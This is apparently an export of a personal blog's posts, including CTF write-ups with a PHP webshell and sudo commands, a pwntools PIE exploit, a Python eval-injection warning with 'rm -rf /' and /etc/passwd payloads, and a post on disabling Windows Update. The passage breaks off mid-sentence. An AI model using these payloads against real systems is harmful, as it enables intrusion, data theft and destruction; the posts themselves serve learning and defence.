[{"content":"こんにちは～\nこのブログで、私のラノベ感想シリーズを始めます。日本語力をもっと上達させるために、このシリーズを書くことにしました。もともと日本語を勉強し始めたきっかけは、ただラノベを読みたかったからです。もちろん英語や他の言語でもラノベを読むことはできますが、日本語で読むと特別な感触がありますね。作者と直接つながっているような気持ちになります。\nラノベはそれなりに読んでいますが、その感想や自分の意見を書くことはほとんどありません。頭の中で思っていることを言葉にするのが難しいんです。だからこそ、これは練習しなければと思いました。でも「どこで感想を書く練習をすればいいかな」と迷っていたときに、このシリーズを思いつきました。\nこの記事は序章なので、まだラノベの感想はありませんが、次回の記事を楽しみにしていてください。それでは、今回はこのへんで。\n","permalink":"/posts/lightnovel-jp/","summary":"\u003cp\u003eこんにちは～\u003c/p\u003e\n\u003cp\u003eこのブログで、私のラノベ感想シリーズを始めます。日本語力をもっと上達させるために、このシリーズを書くことにしました。もともと日本語を勉強し始めたきっかけは、ただラノベを読みたかったからです。もちろん英語や他の言語でもラノベを読むことはできますが、日本語で読むと特別な感触がありますね。作者と直接つながっているような気持ちになります。\u003c/p\u003e\n\u003cp\u003eラノベはそれなりに読んでいますが、その感想や自分の意見を書くことはほとんどありません。頭の中で思っていることを言葉にするのが難しいんです。だからこそ、これは練習しなければと思いました。でも「どこで感想を書く練習をすればいいかな」と迷っていたときに、このシリーズを思いつきました。\u003c/p\u003e\n\u003cp\u003eこの記事は序章なので、まだラノベの感想はありませんが、次回の記事を楽しみにしていてください。それでは、今回はこのへんで。\u003c/p\u003e","title":"ラノベ感想の始まります"},{"content":"As someone coming from linux, there is one thing that I miss when trying to daily driving windows, and that is the terminal. Windows has great terminal emulator nowadays, with powershell being windows\u0026rsquo; most powerful shell.\nYou see, it\u0026rsquo;s really natural for me to spend most of my time in the terminal when I\u0026rsquo;m using linux, it\u0026rsquo;s just much more simple and more focused. Not only that, the commands in linux are really short consisting of 2-6 letters on average, and once you know your way, you can combine any of that commands to make everything even more concise and quick.\nThat being said, here we will take a look on how to navigate windows file system and do simple actions in windows using powershell.\npwd A lot of powershell commands that has been aliased to that of the bash counterpart, however pwd is not one of them. We need to use Get-Location to print current working directory.\n\u0026gt; Get-Location Path ---- C:\\Users\\deni ls Powershell counterpart Get-ChildItem. Alias ls, dir, gci.\n\u0026gt; ls Directory: C:\\Users\\deni Mode LastWriteTime Length Name ---- ------------- ------ ---- d-r--- 9/13/2025 22:28 Desktop d-r--- 9/16/2025 11:07 Documents d-r--- 9/15/2025 19:18 Downloads d-r--- 8/23/2025 12:25 Favorites d----- 9/5/2025 16:39 Games d-r--- 8/23/2025 12:25 Links cd Powershell counterpart Set-Location. Alias cd, sl.\n\u0026gt; cd $HOME cp Powershell counterpart Copy-Item. Alias cp, copy.\ncp file1.txt file2.txt ","permalink":"/posts/powershell-basic/","summary":"\u003cp\u003eAs someone coming from linux, there is one thing that I miss when trying to\ndaily driving windows, and that is the terminal. Windows has great terminal\nemulator nowadays, with powershell being windows\u0026rsquo; most powerful shell.\u003c/p\u003e\n\u003cp\u003eYou see, it\u0026rsquo;s really natural for me to spend most of my time in the terminal\nwhen I\u0026rsquo;m using linux, it\u0026rsquo;s just much more simple and more focused. Not only that,\nthe commands in linux are really short consisting of 2-6 letters on average, and\nonce you know your way, you can combine any of that commands to make everything\neven more concise and quick.\u003c/p\u003e","title":"Powershell Basics for Bash User"},{"content":"When I first started learning languages, I realized something important: it’s not really about memorizing grammar rules.\nA language is just a tool. Its purpose is communication. And like any tool, the best way to learn how to use it is by watching how the experts — native speakers — actually use it.\nFor example, you can’t just copy English sentence structures when speaking Japanese. The meaning might survive, but it will sound completely unnatural. Each language has its own “design patterns.”\nMy Story I’m not a native English speaker. I first studied English in elementary school, and for years it was just endless grammar drills and vocabulary lists.\nThe goal wasn’t fluency. It was just getting good grades.\nAfter twelve years of “studying,” I still couldn’t hold a simple conversation in English. I knew a lot of words, but I had no idea how to actually use them.\nThat’s when desperation hit. I wanted to really learn.\nThe Programming Connection Around the same time, I got into programming. At first, I studied programming in my native language. But soon I realized all the newest tutorials, docs, and frameworks were in English.\nIf I wanted to stay current, I had no choice: I had to learn both programming and English — together.\nConsuming English Media It started with documentation and tutorials. Then walkthroughs, memes, videos, and forums.\nWithout noticing it, I was immersing myself in English every single day.\nAnd slowly, things clicked.\nNow I can write blog posts like this one in English. Sure, my English is still imperfect, but it works. And that’s the point.\nWhy This Works Learning only grammar and vocabulary is like memorizing syntax without ever writing code.\nYou don’t really get it until you use it in real situations.\nConsuming media in your target language makes the process less intimidating. You’ll see how native speakers bend the rules, use shortcuts, or even make mistakes — and yet they still understand each other.\nThat’s when you realize: communication matters more than perfection.\nAdvice If you’re learning a new language, dive into the content you love.\nRead docs. Watch videos. Join communities. Play games. Even scroll memes.\nAt first, you’ll feel lost. That’s normal. But confusion is part of the process.\nEventually, things start making sense. And that “click” moment feels way better than having a teacher just hand you a grammar rule.\n","permalink":"/posts/reading-preferred-content-foreign-language/","summary":"\u003cp\u003eWhen I first started learning languages, I realized something important: it’s not really about memorizing grammar rules.\u003c/p\u003e\n\u003cp\u003eA language is just a tool. Its purpose is communication. And like any tool, the best way to learn how to use it is by watching how the experts — native speakers — actually use it.\u003c/p\u003e\n\u003cp\u003eFor example, you can’t just copy English sentence structures when speaking Japanese. The meaning might survive, but it will sound completely unnatural. Each language has its own “design patterns.”\u003c/p\u003e","title":"Learning a Language by Using What You Love"},{"content":"Ever since I installed my first Linux distro (good old Ubuntu), I never once thought about going back to Windows. I mean, why would I? Before Linux, I only touched computers for gaming. Anything beyond that—writing documents, checking emails, or wrestling with random Blue Screen of Death encounters—sounded like the digital equivalent of watching paint dry.\nLinux changed everything. Suddenly, computers weren’t these boring office machines—they were fun. They were obedient little metal pets that did whatever I told them to. Want to customize your entire desktop? Sure. Want to write a bash script that does absolutely nothing useful but makes you feel like a hacker? Go for it. Want to nuke your bootloader at 2 AM and spend the next 4 hours fixing it? Linux says, “Challenge accepted.”\nThat was the magic for me. Linux taught me that computers could be playful, powerful, and… chaotic in a good way. So I dove into the Linux rabbit hole and never looked back. Until reality hit me.\nThe Windows Reality Check Here’s the problem: normal people—like, actual humans who don’t compile their own kernels for fun—still use Windows. At work, in college, at grandma’s house… it’s Windows everywhere. So, for survival, I knew I had to at least understand how Windows works. Which is how I ended up daily driving Windows 11.\nAnd let me tell you something, friends: there is one thing about Windows that makes me want to throw my PC into a volcano—forced updates.\nWhy, Microsoft, Why?! Imagine this: You’re in the middle of something important, maybe coding, maybe watching cat videos in glorious 4K, and suddenly Windows is like:\n“Hey buddy, just a quick restart for an update… OR I’LL DO IT MYSELF IN 15 MINUTES.”\nExcuse me, what? My Linux brain cannot process this tyranny. On Linux, updates are like polite guests—they knock, you open the door when you feel like it. On Windows? They’re SWAT teams kicking down your door at 3 AM because some DLL needs a security patch.\nSo, naturally, I decided to fight back.\nHow to Make Windows Updates Cry Here’s the trick. The Windows Update service depends on a very specific DLL file to work. If that file… mysteriously disappears (or, you know, gets renamed), the service won’t even start. And without the service, updates can’t run.\nThat file lives here:\nC:\\Windows\\System32\\wuaueng.dll Rename it to:\nwuaueng.dll.bak And boom—Windows Update is dead in the water. Just make sure to stop the Windows Update service first, or it’ll yell at you.\nThe Catch (Because There’s Always One) Some apps—cough Microsoft Store cough—need the Windows Update service to work. So if you want to install something from the Store, you’ll need to:\nRename wuaueng.dll.bak back to wuaueng.dll. Start the Windows Update service. Do your Store thing. Rename the DLL back and stop the service again. It’s like babysitting a stubborn toddler. But hey, it works.\nBut What About TrustedInstaller? If you try renaming the file and Windows slaps you with a TrustedInstaller error, don’t panic. You just need to take ownership of the file first. This guide explains how: How to Control Files in Windows\nFinal Thoughts Do I recommend this to everyone? No. Is it a dumb hack that made me feel like a sysadmin wizard? Absolutely. Sometimes, you just want your machine to do what you tell it to—without threatening you with an unwanted restart while you’re neck-deep in a Python script or mid-game in Elden Ring.\nSo yeah, I declared war on Windows Updates… and for now, I’m winning.\n","permalink":"/posts/windows-update-disable/","summary":"\u003cp\u003eEver since I installed my first Linux distro (good old Ubuntu), I never once thought about going back to Windows. I mean, why would I? Before Linux, I only touched computers for gaming. Anything beyond that—writing documents, checking emails, or wrestling with random \u003cstrong\u003eBlue Screen of Death\u003c/strong\u003e encounters—sounded like the digital equivalent of watching paint dry.\u003c/p\u003e\n\u003cp\u003eLinux changed everything. Suddenly, computers weren’t these boring office machines—they were \u003cem\u003efun\u003c/em\u003e. They were obedient little metal pets that did whatever I told them to. Want to customize your entire desktop? Sure. Want to write a bash script that does absolutely nothing useful but makes you feel like a hacker? Go for it. Want to nuke your bootloader at 2 AM and spend the next 4 hours fixing it? Linux says, \u003cem\u003e“Challenge accepted.”\u003c/em\u003e\u003c/p\u003e","title":"How I Declared War on Windows Updates (and Won… Kind of)"},{"content":"The hashcrack challenge from PicoCTF is a practical demonstration of the security risks posed by weak hashing algorithms for passwords. In this write-up, I will detail the steps taken to solve the challenge, the reasoning behind each decision, and the security lessons that can be learned from this exercise. You can try and solve it yourself here.\nChallenge Overview The challenge description states that a company’s server was breached because the administrator used weakly hashed passwords. Our goal is to gain access to the secret message stored on that server. To start, we are given the connection details:\nnc verbal-sleep.picoctf.net 51671 This means the challenge requires interacting with a remote service over Netcat. No additional information is provided beyond the context that weak hashing is involved.\nInitial Interaction with the Service After connecting to the given host and port using Netcat, the service displays the following prompt:\nWelcome!! Looking For the Secret? We have identified a hash: 482c811da5d5b4bc6d497ffa98491e38 Enter the password for identified hash: test Incorrect. Goodbye. From this output, we can infer that the server provides a hash and expects us to supply the correct plaintext password. If the input is incorrect, the connection is closed immediately.\nAnalyzing the Problem The first step is to understand what kind of hash we are dealing with. The hash provided is a 32-character hexadecimal string, which is a strong indicator of the MD5 algorithm. MD5 is widely recognized as an insecure hashing algorithm that is easy to reverse due to precomputed databases and rainbow tables.\nConsidering the challenge difficulty is marked as easy, it would be inefficient to attempt a brute-force attack using tools such as hashcat or John the Ripper. Large wordlists like rockyou.txt could solve the problem eventually, but they would consume unnecessary time and resources. Instead, this situation calls for a more direct and practical solution.\nChoosing the Approach The most efficient approach for this challenge is to use an online MD5 reverse lookup service. Many such services exist, and they work by checking the hash against massive precomputed databases of known hashes. Since this is a Capture The Flag (CTF) environment and the password is almost certainly a common word, this method is quick and effective.\nStep-by-Step Solution The first thing I did was grab the hash the server handed me:\n482c811da5d5b4bc6d497ffa98491e38 Now, I could have gone full hacker mode—spinning up hashcat, loading rockyou.txt, and watching my CPU slowly turn into a space heater—but this was an easy challenge. That means the solution probably isn’t brute force; it’s something much simpler.\nSo I took the pragmatic route. Instead of brute-forcing, I opened Google and typed:\n482c811da5d5b4bc6d497ffa98491e38 pattern Adding the word “pattern” helps Google return relevant reverse-hash lookups instead of random hash algorithm explanations. Sure enough, the very first result was a site called md5hashing.net.\nThis site is essentially a cheat code for CTFs—it told me the exact plaintext for the hash and even confirmed it was MD5. No guesswork.\nI took that plaintext, reconnected to the server, and entered it. Boom—the server accepted it but immediately gave me another hash. So the game was on:\nCopy the new hash. Search again using the same “\u0026lt;HASHVALUE\u0026gt; pattern” trick. Get the plaintext from the website. Submit it to the server. I repeated this process a few times, like solving a puzzle where the answer unlocks the next piece. Finally, after the last submission, the server revealed the ultimate reward: the flag.\nThe Result The flag obtained from the challenge is:\npicoCTF{UseStr0nG_h@shEs_\u0026amp;PaSswDs!_eb2f8459} Key Takeaways This challenge illustrates why MD5 is no longer suitable for password hashing. MD5 hashes can be reversed with ease using publicly available tools and precomputed hash databases. Any system still relying on MD5 for password storage is vulnerable to trivial attacks.\nInstead of MD5, modern applications should implement secure, computationally expensive hashing algorithms designed for password storage, such as bcrypt, scrypt, or Argon2. These algorithms incorporate salting and adjustable work factors, which significantly reduce the effectiveness of brute-force and dictionary attacks.\nTools Used Netcat (nc) – for interacting with the remote service. md5hashing.net – for reversing MD5 hashes using precomputed databases. Afterword This solution emphasizes the importance of avoiding outdated security practices and demonstrates how easy it is to exploit weak hashing in real-world scenarios. The simplicity of this challenge is deliberate—it serves as a reminder that security through obscurity is not security at all.\n","permalink":"/posts/picoctf-hashcrack/","summary":"\u003cp\u003eThe \u003cstrong\u003e\u003ccode\u003ehashcrack\u003c/code\u003e\u003c/strong\u003e challenge from PicoCTF is a practical demonstration of the security risks posed by weak hashing algorithms for passwords. In this write-up, I will detail the steps taken to solve the challenge, the reasoning behind each decision, and the security lessons that can be learned from this exercise. You can try and solve it yourself \u003ca href=\"https://play.picoctf.org/practice/challenge/475\"\u003ehere\u003c/a\u003e.\u003c/p\u003e\n\u003ch2 id=\"challenge-overview\"\u003eChallenge Overview\u003c/h2\u003e\n\u003cp\u003eThe challenge description states that a company’s server was breached because the administrator used weakly hashed passwords. Our goal is to gain access to the secret message stored on that server. To start, we are given the connection details:\u003c/p\u003e","title":"PicoCTF Writeup #475"},{"content":"Hacking Profile Pictures Like It’s 2005 (picoCTF Web Exploit Writeup) So, I tried another picoCTF challenge and this one was basically:\n👨‍💻 “A developer added profile picture uploads. What could possibly go wrong?”\nIf you’ve ever touched PHP (I’m sorry) you already know the answer: literally everything.\nThe challenge: Standard Pizzas 🍕\nUpload Feature? More Like Upload Malware The site lets you upload an image and then proudly tells you where it lives:\nThe file duck.jpeg has been uploaded Path: uploads/duck.jpeg As soon as I saw that, my brain went:\n👉 “Wait… you’re telling me I can upload any file and then run it directly?”\nThis is basically the cybersecurity equivalent of putting the house keys under the doormat.\nCongratulations, You Played Yourself So I uploaded this masterpiece called script.php:\n\u0026lt;?php $result = shell_exec(\u0026#34;pwd\u0026#34;); echo $result; ?\u0026gt; Then I visited /uploads/script.php and the site politely told me:\n/var/www/html/uploads 💥 RCE achieved. PHP once again proving it’s not a bug, it’s a lifestyle.\nPHP Webshell as a Service™ One command was cute, but I wanted full control. So I made a tiny upgrade:\n\u0026lt;?php $command = $_GET[\u0026#34;c\u0026#34;]; echo shell_exec($command); ?\u0026gt; Now I could just run commands directly in the URL:\n/uploads/script.php?c=ls At this point I felt like a 90s movie hacker typing “access mainframe” — except it actually worked.\nDear Root, I’m in Your Walls The challenge said the flag was hiding in /root. No problem. Let’s snoop:\n/uploads/script.php?c=sudo -l Server: “Yeah, you can sudo.” Me: “Say no more.”\n/uploads/script.php?c=sudo ls /root Output:\nflag.txt Time for the final payload:\n/uploads/script.php?c=sudo cat /root/flag.txt And there it was:\npicoCTF{wh47_c4n_u_d0_wPHP_a4ca6ea0} PHP + Uploads = Chaos.exe What did we learn, kids?\nIf you let users upload arbitrary files and run them, you’ve basically created free hacker hosting. File extensions are lies. Never trust them. PHP with shell_exec is like giving a toddler a flamethrower. This challenge was basically an Any% speedrun exploit. Final Thoughts This challenge was a nostalgia trip — straight back to the early 2000s when every site was PHP, every upload folder was writable, and every script kiddie had an edgy handle like “xXhaxor69Xx”.\nSo yeah. Don’t let “profile pictures” execute shell commands. Unless you want hackers to order root access with their pizza. 🍕💻\nFlag: picoCTF{wh47_c4n_u_d0_wPHP_a4ca6ea0}\n","permalink":"/posts/picoctf-writeup-482/","summary":"\u003ch2 id=\"hacking-profile-pictures-like-its-2005-picoctf-web-exploit-writeup\"\u003eHacking Profile Pictures Like It’s 2005 (picoCTF Web Exploit Writeup)\u003c/h2\u003e\n\u003cp\u003eSo, I tried another picoCTF challenge and this one was basically:\u003c/p\u003e\n\u003cp\u003e👨‍💻 \u003cem\u003e“A developer added profile picture uploads. What could possibly go wrong?”\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eIf you’ve ever touched PHP (I’m sorry) you already know the answer: \u003cstrong\u003eliterally everything\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eThe challenge: \u003ca href=\"https://play.picoctf.org/practice/challenge/482\"\u003eStandard Pizzas\u003c/a\u003e 🍕\u003c/p\u003e\n\u003ch2 id=\"upload-feature-more-like-upload-malware\"\u003eUpload Feature? More Like Upload \u003cem\u003eMalware\u003c/em\u003e\u003c/h2\u003e\n\u003cp\u003eThe site lets you upload an image and then proudly tells you where it lives:\u003c/p\u003e","title":"PicoCTF Writeup #482"},{"content":"That One Silly Python Feature Hackers Love (and Devs Hate) 🐍💻 Python is an amazing language. It’s clean, elegant, and super beginner-friendly.\n…until you stumble across one of its cursed features and realize “oh no, this is how hackers get RCE.”\nToday’s silly Python feature: 👉 You can import literally anything, from anywhere.\nWait… I Can Do That? Normally in Python, you import modules at the top like a responsible developer:\nimport os os.system(\u0026#34;ls\u0026#34;) But what if I told you… you can just conjure up imports on the fly, without ever writing import at the top?\nYep. Python lets you do this:\nos = __import__(\u0026#34;os\u0026#34;) os.system(\u0026#34;echo hello, world\u0026#34;) Boom. No import os in sight, but suddenly you’ve got os and all its goodies.\nThis is silly and fun… until you realize it’s also nightmare fuel if your server is evaluating untrusted input.\nEnter the MRO Black Magic 🧙‍♂️ Python has something called the Method Resolution Order (MRO). It’s basically the order Python looks through classes to find methods/attributes.\nHackers realized: “Wait… if everything in Python is an object… and objects know their classes… and classes know their base classes… can’t we… uh… walk through this graph until we find __subclasses__ and then pull imports out of thin air?”\nYes. Yes, you can.\nSomething like this (simplified for the memes):\n().__class__.__base__.__subclasses__() That one-liner is like the Konami code for Python internals. From there, attackers can dig up file handles, os, sys, subprocess… whatever they need.\nWhy Hackers Love This If you’ve ever played with:\nSSTI (Server-Side Template Injection) in Flask/Jinja2 RCE (Remote Code Execution) on a misconfigured Python service …then you’ve probably seen this trick in action.\nYou think you’ve locked down Python? Nah. Some hacker just did ().__class__.__base__.__subclasses__()[1337] and spawned a shell on your server.\nBut Why Is This a Problem? Because developers sometimes write innocent-looking server code like this:\n@app.route(\u0026#34;/calc\u0026#34;) def calc(): return str(eval(request.args.get(\u0026#34;expr\u0026#34;))) And then wonder why their logs suddenly say:\n$ curl \u0026#34;http://example.com/calc?expr=__import__(\u0026#39;os\u0026#39;).system(\u0026#39;rm -rf /\u0026#39;)\u0026#34; 😬\nThe Actual Pro Tip If you’re building anything in Python that runs on the internet:\n🚫 Never eval() user input. Ever. 🚫 Never trust template engines to “sanitize for you.” ✅ Sanitize, whitelist, and validate everything. ✅ Assume hackers will try __import__() from inside your app. Final Thoughts Python is wonderful… but also cursed. The fact that you can import modules without importing them is equal parts genius and dangerous.\nSo next time you’re writing a Flask app and think: “It’s just a tiny eval, what’s the worst that could happen?” — remember: somewhere out there, a hacker is already typing:\n__import__(\u0026#39;os\u0026#39;).system(\u0026#39;cat /etc/passwd\u0026#39;) …and you just turned your server into their personal playground. 🎢\n👉 TL;DR: Python imports are silly, MRO is hacker magic, and you should sanitize your server code before someone “imports chaos.”\n","permalink":"/posts/access-import-anywhere-python/","summary":"\u003ch2 id=\"that-one-silly-python-feature-hackers-love-and-devs-hate-\"\u003eThat One Silly Python Feature Hackers Love (and Devs Hate) 🐍💻\u003c/h2\u003e\n\u003cp\u003ePython is an amazing language. It’s clean, elegant, and super beginner-friendly.\u003c/p\u003e\n\u003cp\u003e…until you stumble across one of its cursed features and realize \u003cstrong\u003e“oh no, this is how hackers get RCE.”\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eToday’s silly Python feature:\n👉 You can \u003cstrong\u003eimport literally anything, from anywhere.\u003c/strong\u003e\u003c/p\u003e\n\u003ch2 id=\"wait-i-can-do-that\"\u003eWait… I Can Do \u003cem\u003eThat?\u003c/em\u003e\u003c/h2\u003e\n\u003cp\u003eNormally in Python, you import modules at the top like a responsible developer:\u003c/p\u003e","title":"Access Import Anywhere in Python"},{"content":"Python loves inheritance. You can make classes inherit from other classes, those classes inherit from others, and suddenly you’ve got a full-blown family tree that looks like someone spilled spaghetti on your UML diagram. And then you run into the question: when I call a method, which ancestor actually answers the call?\nThat’s where MRO (Method Resolution Order) comes in. Think of it like ls for Python’s class hierarchy—it shows you the exact path Python will take when looking for a method. No more guessing which def speak() gets invoked when you’ve got five grandparents fighting for attention.\nThe Basics Python is object-oriented, meaning you can create classes, inherit from them, and override their behavior. But when you’ve got multiple inheritance (aka the diamond problem’s evil cousin), things get spicy.\nWhen you call a method, Python doesn’t just randomly pick one like a dodgy RNG—it follows the C3 linearization algorithm. That’s a fancy name for “a set of rules that decide which class is checked first, second, third, and so on.”\nAccessing MRO You can inspect the Method Resolution Order in two ways:\n__mro__ attribute (tuple of classes) mro() method (returns a list) They both spill the same beans; one’s just slightly more Pythonic to read.\nExample Time class A: def speak(self): return \u0026#34;A\u0026#34; class B(A): pass class C(A): def speak(self): return \u0026#34;C\u0026#34; class D(B, C): pass if __name__ == \u0026#34;__main__\u0026#34;: print(D.__mro__) Running this gives:\n( \u0026lt;class \u0026#39;__main__.D\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;__main__.B\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;__main__.C\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;__main__.A\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;object\u0026#39;\u0026gt; ) What Just Happened? Notice something weird? Class C does have its own speak() method, but Python checks B before C, because when defining class D(B, C), we listed B first. So Python politely knocks on B’s door before asking C. Since B doesn’t override speak(), it continues down the chain and finds C.\nThe rule of thumb: the order in your inheritance list matters. If you inherit from B, C, then Python tries B first, then C. If you flip them to C, B, the story changes.\nWhy Should You Care? If you’re just subclassing one class, MRO is basically a non-issue. But once you’ve got multiple inheritance, especially those diamond-shaped hierarchies, debugging without understanding MRO is like trying to resolve merge conflicts while half-asleep.\nKnowing MRO saves you from late-night “why the hell is it calling that method” moments.\nPro tip: If you’re ever lost, just print(SomeClass.mro()) and you’ll see the exact search path. Treat it like traceroute for methods.\nAfterword Think of MRO like your package manager:\napt (Python) has strict rules to decide dependencies. You don’t always agree with them. But if you fight it, your whole system breaks. So… just trust the algorithm. It’s smarter than you, me, and probably most of Stack Overflow combined.\n","permalink":"/posts/mro-python/","summary":"\u003cp\u003ePython loves inheritance. You can make classes inherit from other classes, those classes inherit from others, and suddenly you’ve got a full-blown family tree that looks like someone spilled spaghetti on your UML diagram. And then you run into the question: \u003cem\u003ewhen I call a method, which ancestor actually answers the call?\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eThat’s where \u003cstrong\u003eMRO (Method Resolution Order)\u003c/strong\u003e comes in. Think of it like \u003ccode\u003els\u003c/code\u003e for Python’s class hierarchy—it shows you the exact path Python will take when looking for a method. No more guessing which \u003ccode\u003edef speak()\u003c/code\u003e gets invoked when you’ve got five grandparents fighting for attention.\u003c/p\u003e","title":"Understanding Python’s Method Resolution Order (MRO) Without Losing Your Sanity"},{"content":"I’ve never been into gacha games. My taste in gaming is simple: give me a good RPG or a visual novel and I’m set. Why? Because I’m a sucker for story. Graphics will keep evolving anyway — that’s just Moore’s Law with prettier shaders. But story? That’s pure human creativity, the real kernel that makes the whole program worth running.\nBut then one day, I stumbled onto this game called Zenless Zone Zero. The fandom wouldn’t stop posting memes about how it’s basically a gooner simulator. And yeah… they weren’t wrong. I tried it. I’m playing it. Don’t @ me.\nThe lore? Dark. Like “dmesg | grep depression” levels of dark. We’re talking loss, trauma, existential dread — basically the systemd-journald logs of human suffering. Naturally, I got hooked. And then I discovered something worse than the emotional rollercoaster: the game mechanics. Holy init scripts, there are so many moving parts. Mini-games, systems, currencies — it’s like Gentoo, but with waifus.\nSo, as a service to fellow lazy gamers and Linux nerds, here’s a quick glossary of common gacha terms. Think of it as a man page for the gacha-curious.\nWhat are Gacha Games? At their core, gacha games are games where the prizes are randomized. Imagine apt-get install random-waifu but it costs you your soul (and possibly your rent money). Gameplay can vary — some are RPGs, some are action-based, some just want you to click buttons like a bash script stuck in an infinite loop.\nBanner Think of this as the repo you pull from. It’s the place where the game says, “Hey, we’ve got shiny stuff right now, wanna roll the dice?”\nGacha Pulls The act of gambling with virtual dice. You “pull” on the banner, and the game spits out a prize. Most of the time it’s digital garbage. Occasionally, it’s something that makes your brain release enough dopamine to rival compiling a kernel with zero errors.\nFive-Star Item The golden goose, the sudo of the loot pool. If you get one, you feel invincible. Four-stars exist too, but they’re basically the Arch Linux wiki mirrors — nice to have, but you’ll forget them when the shiny one appears.\nPity System A mercy mechanic. It guarantees you’ll eventually get something good if luck isn’t on your side. Example: after enough failed pulls, the game says, “Fine, here’s your toy. Now stop crying.” It’s like fsck for your gambling addiction.\nMicrotransactions Tiny purchases that add up faster than your /var/log directory. “Just $0.99!” they say, but soon your bank account looks like a corrupted partition table.\nF2P Short for “Free to Play.” These are the noble monks of the gacha monastery, grinding daily missions without spending a cent. Basically, the Debian Stable users of the gacha world.\nWhale The opposite of F2P. Whales casually drop hundreds or thousands of dollars like it’s rm -rf /money. They keep the servers alive. Respect them, fear them, and pray you don’t end up becoming one.\nGear Equipment for your characters. It’s the ~/.config directory of your waifus. Without gear, your squad is just fancy-looking processes waiting to be killed by a segmentation fault.\nMeta The “Most Effective Tactic Available.” It’s whatever the community says is overpowered at the moment. Like switching from Vim to Neovim because “everyone does it.” You don’t have to follow the meta, but if you don’t, be ready to suffer.\nRerun When a banner comes back for round two. Missed your chance at that one character last year? Congrats, here’s your second chance to fail again.\nFinal Thoughts Gacha games are like package managers with a cruel sense of humor. You don’t always get what you want, but the cycle of pulling, grinding, and coping is strangely addicting. For programmers and Linux users, it’s basically debugging life: lots of frustration, occasional victories, and an endless log of questionable decisions.\nAt least in Linux, when you run make, you know it’ll eventually compile. In gacha, the compiler is randomness itself — and it has a tendency to segfault just when you need it most.\n","permalink":"/posts/gacha-terms/","summary":"\u003cp\u003eI’ve never been into gacha games. My taste in gaming is simple: give me a good RPG or a visual novel and I’m set. Why? Because I’m a sucker for story. Graphics will keep evolving anyway — that’s just Moore’s Law with prettier shaders. But story? That’s pure human creativity, the real kernel that makes the whole program worth running.\u003c/p\u003e\n\u003cp\u003eBut then one day, I stumbled onto this game called \u003ca href=\"https://zenless.hoyoverse.com/\"\u003eZenless Zone Zero\u003c/a\u003e. The fandom wouldn’t stop posting memes about how it’s basically a gooner simulator. And yeah… they weren’t wrong. I tried it. I’m playing it. Don’t @ me.\u003c/p\u003e","title":"Gacha Game Terms for Lazy Players"},{"content":"Binary Exploitation Challenge (PIE \u0026amp; Function Hijacking in picoCTF) I’ve always been fascinated by low-level programming and security, but up until now I hadn’t really tried a binary exploitation challenge. Recently, I stumbled upon this picoCTF challenge called “rescue-float” — and let me tell you, it was a mix of confusion, discovery, and a little bit of victory at the end.\nThis post is a casual walkthrough of how I approached it as a beginner. If you’re into Linux, development, or cybersecurity, you’ll probably find this fun (or at least relatable if you remember your first binary exploitation adventure).\nThe Challenge Setup We’re given a binary and its source code. The task is to “try to get the flag” while keeping in mind that PIE (Position Independent Executable) is enabled.\nWhen you run the binary, it prints the address of main and asks for an address to jump to:\n$ ./vuln Address of main: 0x55709267a33d Enter the address to jump to, ex =\u0026gt; 0x12345: 0x80 Your input: 80 Segfault Occurred, incorrect address. On the remote server, the behavior is the same — except the addresses are totally different each time. That got me thinking: what’s going on here?\nFirst Observations Digging into the binary with strings, I spotted something very interesting:\nSegfault Occurred, incorrect address. You won! flag.txt Cannot open file. That \u0026quot;You won!\u0026quot; string was a big clue. Clearly, there’s a win() function hidden in there that we need to call instead of crashing.\nSo the real trick is figuring out the runtime address of win().\nA Quick Detour: What’s PIE? At first, I thought PIE was about pie (yes, 3.14 🍰). Turns out, PIE stands for Position Independent Executable.\nIn simple terms: every time you run the program, its code is loaded into a different random memory location. That means addresses of functions like main() or win() change constantly.\nTo exploit it, you need to:\nLeak one known address (in this case, the program conveniently prints the address of main()). Use that to calculate the base address of the binary in memory. From there, compute the real address of win(). Peeking at the Source Here’s the core of the challenge:\nint main() { signal(SIGSEGV, segfault_handler); setvbuf(stdout, NULL, _IONBF, 0); printf(\u0026#34;Address of main: %p\\n\u0026#34;, \u0026amp;main); unsigned long val; printf(\u0026#34;Enter the address to jump to, ex =\u0026gt; 0x12345: \u0026#34;); scanf(\u0026#34;%lx\u0026#34;, \u0026amp;val); printf(\u0026#34;Your input: %lx\\n\u0026#34;, val); void (*foo)(void) = (void (*)())val; foo(); } Yep, the program literally takes your input, interprets it as a function pointer, and jumps there. If you guess wrong? Segfault. Guess right? Profit.\nExploit Development (with Pwntools) I used pwntools, which makes life much easier for challenges like this. The plan:\nLeak the runtime address of main. Compute the PIE base address. Add the offset of win() to get its actual address. Send that address back as input. Here’s the final script:\nfrom pwn import * HOST = \u0026#34;rescued-float.picoctf.net\u0026#34; PORT = 63489 # (check challenge for actual port) elf = context.binary = ELF(\u0026#34;./vuln\u0026#34;) p = remote(HOST, PORT) # Leak main() p.recvuntil(b\u0026#34;Address of main: \u0026#34;) leaked_main = int(p.recvline().strip(), 16) log.info(f\u0026#34;Leaked main: {hex(leaked_main)}\u0026#34;) # Compute PIE base pie_base = leaked_main - elf.sym[\u0026#39;main\u0026#39;] elf.address = pie_base log.info(f\u0026#34;PIE base: {hex(pie_base)}\u0026#34;) # Compute win() win_addr = elf.sym[\u0026#39;win\u0026#39;] log.success(f\u0026#34;win() at: {hex(win_addr)}\u0026#34;) # Send it p.recvuntil(b\u0026#34;Enter the address to jump to\u0026#34;) p.sendline(hex(win_addr).encode()) # Get the flag print(p.recvall().decode(errors=\u0026#34;ignore\u0026#34;)) And boom — the output:\nYou won! picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_cb52e722} Reflections Honestly, this was overwhelming at first. I had to Google like crazy, read about PIE, function pointers, and pwntools usage. But that’s the fun part — these challenges force you to learn by doing.\nKey takeaways for me:\nPIE randomizes addresses, but once you leak one function’s address, you can recover the rest. Binary exploitation isn’t always about buffer overflows. Sometimes, the vulnerability is right in front of you (like letting the user call any address they want). Pwntools is an absolute lifesaver. Final Thoughts If you’re new to binary exploitation like me, this challenge is a fantastic first step. You’ll get a feel for memory addresses, PIE, and how attackers chain small leaks into 